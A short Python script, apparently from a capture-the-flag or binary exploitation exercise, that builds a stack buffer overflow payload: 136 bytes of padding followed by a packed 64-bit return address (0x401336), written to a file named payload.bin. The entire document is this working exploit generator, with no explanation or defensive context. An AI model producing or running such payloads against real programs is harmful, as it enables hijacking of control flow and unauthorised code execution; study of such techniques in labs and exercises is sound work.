from pathlib import Path
import struct

address = 0x401336
payload = b"A" * 136 + struct.pack("<Q", address)

output_path = Path("payload.bin")
output_path.write_bytes(payload)

print(f"Created {output_path} ({len(payload)} bytes)")
